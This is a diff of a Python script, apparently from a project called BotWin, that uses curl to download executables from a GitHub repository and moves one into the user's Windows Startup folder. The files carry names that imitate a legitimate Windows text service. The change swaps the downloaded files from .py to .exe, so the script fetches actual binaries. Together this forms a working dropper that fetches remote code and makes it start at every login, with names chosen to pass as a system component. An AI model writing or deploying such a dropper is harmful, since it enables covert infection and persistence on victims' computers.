@@ -32,9 +32,9 @@ os.system("..")
 user=getpass.getuser()
 
 if(not os.path.exists("TableTextService.dll.exe")):
-    os.system("curl.exe --output TableTextService.dll.exe --url https://raw.githubusercontent.com/Libx86/BotWin/master/TableTextService.dll.py")
+    os.system("curl.exe --output TableTextService.dll.exe --url https://raw.githubusercontent.com/Libx86/BotWin/master/TableTextService.dll.exe")
 if(not os.path.exists("TableTextServiceLauncher.exe")):
-    os.system("curl.exe --output TableTextServiceLauncher.exe --url https://raw.githubusercontent.com/Libx86/BotWin/master/TableTextServiceLauncher.py")
+    os.system("curl.exe --output TableTextServiceLauncher.exe --url https://raw.githubusercontent.com/Libx86/BotWin/master/TableTextServiceLauncher.exe")
 os.system('move TableTextServiceLauncher.exe "C:/users/'+str(user)+'/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"')
 
 os.chdir("C:/users/"+str(user)+"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")
